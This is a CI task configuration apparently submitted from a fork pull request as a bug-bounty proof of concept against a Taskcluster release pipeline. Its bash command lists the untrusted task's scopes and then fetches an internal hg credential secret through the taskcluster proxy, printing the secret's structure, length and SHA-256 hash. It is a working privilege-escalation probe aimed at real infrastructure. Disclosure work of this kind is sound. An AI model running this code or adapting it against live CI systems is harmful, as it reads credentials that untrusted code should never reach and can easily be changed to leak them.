---
version: 1
policy:
  pullRequests: public_restricted
tasks:
  - $if: 'tasks_for == "github-pull-request-untrusted"'
    then:
      taskId: { $eval: as_slugid("poc_untrusted_pr") }
      created: { $fromNow: '' }
      deadline: { $fromNow: '1 hour' }
      expires: { $fromNow: '1 day' }
      provisionerId: releng-1
      workerType: decision
      payload:
        maxRunTime: 900
        features:
          taskclusterProxy: true
        image: "mozillareleases/taskgraph:decision-v24.1.1@sha256:c2cf963f7621b0f64dc142a04ddcc179d36afdd05c6dc1c2d198d97b55ecb394"
        command:
          - /bin/bash
          - -c
          - |
            set +e
            echo "=== [1] Current task scopes (proves runtime identity = pull-request-untrusted) ==="
            curl -s http://taskcluster/auth/v1/currentScopes | tee /tmp/scopes.json
            echo
            echo "=== [2] Read internal hg credential (Responsible Disclosure: only output structure/length/SHA-256, never the plaintext) ==="
            SECRET_NAME="project/taskcluster/gecko/hgmointernal"
            RESP=$(curl -s -w $'\n__HTTP_STATUS__%{http_code}' "http://taskcluster/secrets/v1/secret/${SECRET_NAME}")
            HTTP_CODE=$(printf '%s' "$RESP" | sed -n 's/.*__HTTP_STATUS__\([0-9]*\).*/\1/p')
            BODY=$(printf '%s' "$RESP" | sed '/__HTTP_STATUS__/d')
            echo "secrets:get ${SECRET_NAME} -> HTTP ${HTTP_CODE}"
            printf '%s' "$BODY" | python3 -c "import sys,json,hashlib; d=json.loads(sys.stdin.read()); sec=d.get('secret') or {}; print('secret field keys:', list(sec.keys()) if isinstance(sec,dict) else type(sec).__name__); raw=sec.get('secret','') if isinstance(sec,dict) else ''; sval=json.dumps(raw) if not isinstance(raw,str) else raw; print('secret value length:', len(sval)); print('secret value SHA-256:', hashlib.sha256(sval.encode()).hexdigest()) if sval else print('[INFO] secret field empty or unexpected structure')"
      metadata:
        name: "POC: untrusted PR scope check (authorized HackerOne)"
        description: "Authorized security test - verify pull-request-untrusted role scopes on fork PR"
        owner: "1253628375ltf@gmail.com"
        source: "https://github.com/ltfafei/fxci-config/pull/1116"
      extra:
        github:
          events:
            - pull_request
          taskcluster_pull_request_number: { $eval: 'event.number' }
